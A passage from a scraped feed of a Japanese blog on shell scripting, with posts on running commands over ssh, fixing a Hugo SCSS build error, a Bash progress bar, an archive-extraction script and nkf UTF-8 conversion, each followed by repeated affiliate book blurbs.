たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-24T18:12:54+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-23-10-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-23-10-ani/","title":"知識ゼロからのe-Statマイニング"},{"content":"やりたいこと sshでサーバーにログインして、なんらかのコマンドを実行しターミナルに表示、ミッション終了後、ターミナルを自動的にログアウトしてローカルに何事もなかったかのようにもどってくる最も簡単な方法ってなにかないでしょうか。\nイメージ 従来の方法\nローカルＰＣのターミナル ↓ Linuxサーバーにログイン $df $uptime などを実行 ↓ Linuxサーバーをログアウト ローカルＰＣにもどる これからつくるBash/ssh\nローカルＰＣのターミナル ↓ Linuxサーバーにログイン $df $uptime などを実行 Linuxサーバーをログアウト ↓ ローカルＰＣのターミナルにもどる わかりにくいですか？\nまず、メリットとしてサーバーでコマンドからログアウトする必要がありません。\nこれができれば、一台一台サーバーのヘルスチェックをせずとも、数十台のサーバーを\n順番に訪ね歩きファイルに出力する事も可能です。\n以下、ソースです。\n#!/usr/bin/bash ############################################## # sshでサーバーにログインして、なんらかのコマンドを # 実行しターミナルに表示、ミッション終了後、ターミ # ナルを自動的にログアウトしてローカルに何事もなか # ったかのようにもどってくる最も簡単シェルスクリプト ############################################## # # サーバーのＩＰアドレスとか SERVER=\u0026#34;centos@xx.xx.xx.xxx\u0026#34; # 実行したいコマンドを \u0026amp;\u0026amp; でつなぐ COMMAND=\u0026#34;uptime \u0026amp;\u0026amp; df -h\u0026#34;; echo \u0026#34;centosサーバーログイン\u0026#34;; # ポイントは -t です。 ssh $SERVER -t $COMMAND; echo \u0026#34;centosサーバーログアウト\u0026#34;; exit; たったこれだけですが、この工夫により多くのサーバーを\nスクリプトで一括回遊することができます。 お試しあれ。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-24T11:55:21+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/","title":"【ssh/Bash】sshでログインして実行して自動的に抜けて返ってくる最も簡単な方法"},{"content":"scssやsassを使ってcssを記述すると、CSSを構造化できてサイトのメンテナンス性が格段に上がります。\nGitHub Pagesで公開しているHugoを使ったサイトscss、sassには対応することが可能なので、sassを導入することはメリットがあります。\nところが、Hugoでscssやsassを含んだファイルをGitHubに公開して、Git Actionで自動ビルドしようとした際に見慣れないエラーが表示されました。\nRun hugo --minify Error: Error building site: TOCSS: failed to transform \u0026#34;scss/style.scss\u0026#34; (text/x-scss). Check your Hugo installation; you need the extended version to build SCSS/SASS. : this feature is not available in your current Hugo version, see https://goo.gl/YMrWcn for more information ... Total in 148 ms Error: Process completed with exit code 255. なにか悪いことでもしたのでしょうか。\nそれとも変な記述をしてしまったのだろうかとか思うところです。\nエラーの内容 こういうときは、落ち着いてエラーを見てみましょう。\n大抵のことはちゃんと教えてくれているはずです。\n今回のエラーは下記のような内容になります。\nCheck your Hugo installation; you need the extended version 「Hugoのインストールを確認してください。extendedバージョンが必要です。」と記述されていおります。\nそれではこのエラーに表示されているextendedとは一体何なのでしょうか。\nエラーの対応 さらに落ち着いて設定ファイルを確認していくことにしましょう。\n読み進めていくとどうやらworkflowの設定ファイルにヒントがありそうです。\n.github/workflow/gh-pages.yml\n- name: Setup uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#39;0.87.0\u0026#39; #extended: true .github/workflow/の設定ファイル確認したところ、原因がわかりました。\n設定のextendedが思いっきりコメントアウトされていることが原因でした。\n通常のHugoではscss/cssを使用することができません。そうした場合に、Hugo ExtendedをインストールしてHugo自体の機能を拡張してscss/cssを使えるようにするのですが、今回はscssを使っていたにもかかわらず、Hugo Extendedをインストールしていないため発生していたエラーでした。\nコメントを外して、再度Gitにpushしたところ、正常にビルドされて公開できました。\nまとめ scssやsassを含んだファイルをhugoをgitに公開しようとした際に、ビルドできない場合は設定を確認することをオススメします。\nとくに、scssを使用する際はHugo Extendedのインストールが必要と公式にも書いているので、忘れずに設定しましょう。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-24T09:43:41+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-24-hugo-ywat/af7ef3c0-44c1-4f2f-aad8-1a0664724558_huf3902e4d08fb0294f3a250034e0748e3_207097_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-24-hugo-ywat/","title":"SCSS/CSSを含んだファイルがGitHubActionsでビルドできない"},{"content":"プログレスバー ターミナルで、処理の進捗が表示されるプログレスバーというのがあります。\n処理が進むにつれて、ジリジリとメーターが右に増えていくあれです。\nシェルスクリプトでも作れないものかとチャレンジしたので参考にして下さい\n使い方 処理のループ中に以下の1行を追記します。\nprogress \u0026#34;$#\u0026#34; \u0026#34;$MAX\u0026#34;; set - \u0026#34;$@\u0026#34; count ; 実行手順 以下のソースコードを適当なファイル名で保存して下さい。ここではProgress.shとします。\n$ :\u0026gt; Progress.sh $ vim Progress.sh # vimで以下のソースコードを貼り付けて保存 # ソースコードのファイルエンコードをUTF-8に変更します。 $ nkf -wLu Progress.sh \u0026gt; Progress.sh.utf8 # ファイルエンコードを変更したファイルを元のファイル名にリネームします。 $ mv Progress.sh.utf8 Progress.sh # 実行権限を付与します $ chmod +x Progress.sh # 実行 $ ./Progress.sh ソースコード #! /bin/bash ####################################### # 進捗を表示するプログレスバー # ####################################### # # # percent $1 # GT $2 progress(){ percent=$1; GT=$2; column=`expr 71 \\* \u0026#34;$percent\u0026#34; / $GT`; nspace=`expr 71 - \u0026#34;$column\u0026#34;`; #プログレスバーのカーソルを左端に戻すリターンコードと[の文字をbarに代入 bar=\u0026#39;\\r[\u0026#39;; #位置パラメータの数($#)を１にリセット（カウンタとして流用） set dummy ; while [ $# -le \u0026#34;$column\u0026#34; ];do bar=$bar\u0026#39;=\u0026#39;; # barに=を追加 set - \u0026#34;$@\u0026#34; dummy; # $#をインクリメント done bar=$bar\u0026#39;\u0026gt;\u0026#39;; #barの先端に\u0026gt;を追加 #位置パラメータの数($#)を１にリセット（カウンタとして流用） set dummy ; while [ $# -le \u0026#34;$nspace\u0026#34; ]; do bar=$bar\u0026#39; \u0026#39;; set - \u0026#34;$@\u0026#34; dummy; done bar=$bar\u0026#39;]\u0026#39;$percent/$GT\u0026#39;\\c\u0026#39;; # barに]と１行分のプログレスバーを表示 echo -e \u0026#34;$bar\u0026#34;; } ####################################### # メイン処理 # set count ; MAX=100 ; #最大値を100とする。実際に掛かる処理数の最大値を入れて下さい。 # for (( i=0; i\u0026lt;$MAX; i++)){ # ループする処理に以下の一行を埋め込めばプログレスバーが表示されます。 progress \u0026#34;$#\u0026#34; \u0026#34;$MAX\u0026#34;; set - \u0026#34;$@\u0026#34; count ; } echo \u0026#34;\u0026#34;; # #終了 exit ; 使い方 シェルスクリプトで自作したなんらかの処理ファイルにprogress()関数を貼り付けます。\n自作ソースの中のループ処理の関数の頭に以下を追記します。\nMAX=100; は、処理の最大値を指定します。\n処理のループ最大数が150回であれば、以下の通りに修正します。\nset count; MAX=150; forやwhileループ処理の中に以下を埋め込みます。\nprogress \u0026#34;$#\u0026#34; \u0026#34;$MAX\u0026#34;; set - \u0026#34;$@\u0026#34; count ; 最後にforまたはwhileループを抜けた後に\necho \u0026#34;\u0026#34;; を追加します。これだけです。\n実行結果 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-23T16:10:20+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/","title":"【プログレスバー】Bashでプログレスバーを作ってみようって話"},{"content":"できること 圧縮されているファイルを、ファイルの拡張子にあわせて解凍すると言う作業は、日常的に多いものです。今回は、圧縮ファイルの拡張子を判断して自動的に解凍するシェルスクリプトを作成してみます。\n圧縮ファイルと実行コマンド、パラメータ一覧 拡張子 パラメータ tgz | tar.gz tar zxvf tar.Z gunzip tar.bz2 tar xvfj tar tar xvfz gz gunzip Z gunzip bz2 bunzip2 zip unzip こうしたコマンドやパラメータを覚えておくことは大切ですが、頭の経年劣化とともに、つい思い出すことができず、Googleで検索して調べると言ったことは、往々にしてあることです。\n実行例 # 圧縮ファイルを解凍する便利な unCompコマンド $ unComp comp.tar.gz2 作成 まずファイルを作ります。ファイル名は unComp とします\n# unComp というファイルを作成 $ :\u0026gt; unComp # vim で unComp を開く $ vim unComp unCompファイルに以下の内容を貼り付ける\n#!/bin/bash # #圧縮されているファイルを解凍する # unComp を /usr/local/bin/にコピーすると # 通常のコマンドとして本実行ファイルを利用する事が出来ます。 # # cp unComp /usr/local/bin/unComp # # 実行例 # $ unComp filename(圧縮ファイル) # if [ $# -ne 1 ]; then echo \u0026#34;\u0026#34; exit ; fi # case $1 in *.tgz | *.tar.gz) tar zxvf $1 ;; *.tar.Z) gunzip $1 tar xvf $( echo \u0026#34;$1\u0026#34; | sed \u0026#39;s/\\.Z$//\u0026#39;) ;; *.tar.bz2) tar xvfj $1;; *.tar) tar xvfz $1;; *.gz) gunzip $1;; *.Z) gunzip $1;; *.bz2) bunzip2 $1;; *.zip) unzip $1;; *) echo \u0026#34;ファイルの拡張子が対応していません:$1\u0026#34; esac exit ; 作成したファイルには日本語が含まれているため、unCompファイルを UTF-8に変換しておきます。\nwLuをつかってUTF-8に変換するとさらに便利です。\n# unComp ファイルをnkf -wLu でUTF-8に変換 $ nkf -wLu unComp \u0026gt; unComp.txt # unComp.txtをunCompにリネームします $ mv unComp.txt unComp # 作成したunCompコマンドファイルを/usr/local/bin にコピーします $ sudo unComp /usr/local/bin/ # コマンドが配置されたかを確認 $ which unComp $ /usr/local/bin/unComp 使い方 # 圧縮ファイルの拡張子を気にせずをコマンド一発で解凍する # 実行 $ unComp sample.zip 圧縮ファイルの拡張子に併せたコマンドを思い出したり、さらにはコマンドのパラメータをGoogleで調べたりする必要が減ります。必要に応じて、ソースにコマンドやパラメータを追加すれば、さらに拡張できます。\n便利ですね。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-23T13:11:13+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-25-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-25-01-suzuki/","title":"【unComp】Bashで便利なコマンドを作ってみようって話"},{"content":"必要なもの ネットワーク漢字フィルター nkf\n※macの場合、Homebrew が必要になります。\nnkf インストールの手順 まず、nkfがインストールされているかを確認します。\n$ which nkf /usr/local/bin/nkf インストールされていない場合、macの場合はbrewでインストールします。\n$ brew install nkf インストールしようとすると以下のエラーが出ることがあります\nError: The `brew link` step did not complete successfully The formula built, but is not symlinked into /usr/local Could not symlink share/man/ja/man1/nkf.1 /usr/local/share/man/ja/man1 is not writable. 権限周りを下記のコマンドを打って変更します。\nsudo chmod 775 /usr/local/share/man/ja/man1 sudo chown \u0026lt;ユーザ名\u0026gt;:admin /usr/local/share/man/ja/man1 コマンドを確認します。\n$ nkf -v Network Kanji Filter Version 2.1.5 (2018-12-15) Copyright (C) 1987, FUJITSU LTD. (I.Ichikawa). Copyright (C) 1996-2018, The nkf Project. 使い方 nkfコマンドとは？\n「nkf」は「Network Kanji Filter」の略で、LinuxとWindowsなど、異なるOS間でテキストデータを交換する際に問題となる文字コードと改行コードを変換するためのコマンドです。\nnkfコマンドの書式\nnkf オプション ファイル名\nUTF-8に変換する場合は、オプションに wLu をつけて変換します。\n$ nkf -wLu isofile.txt \u0026gt; utf8.txt 変換の流れ（手動編） 元ファイル moto.txt (UTF-8以外のファイルエンコード、改行コード）\n↓\n変換後のファイル ato.txt(UTF-8に変換したファイル）\n↓\n変換後のファイルをリネームする\n# UTF-8に変換 $ nkf -wLu moto.txt \u0026gt; ato.txt # 変換後のファイルを元のファイル名にリネームする $ mv ato.txt moto.txt # vimiでファイルエンコードを確認する $ vim moto.txt 面倒ですね。ここで、一発でUTF-8に変換するコマンドを作成してみます。\n変換の流れ（自動編） # UTF-8に変換 wLu コマンドをこれから自作します $ wLu moto.txt $ vim moto.txt ← UTF-8 に変換されている！ コマンドの内容 まずファイルを作ります。ファイル名は wLu とします\n# wLu というファイルを作成 $ :\u0026gt; wLu # vim で wLu を開く $ vim wLu 以下の内容をファイルに貼り付ける\n#!/bin/bash ################################################# # パラメータで渡されたファイル名をutf8に変換する # # 使い方 # wLu UTF-8に変換したいファイル名 # wLu を /usr/local/bin/にコピーすると # 通常のコマンドとして本実行ファイルを利用する事が出来ます。 # ################################################# # filename=\u0026#34;$1\u0026#34; ; # function wLu(){ if [ -f \u0026#34;$filename\u0026#34; 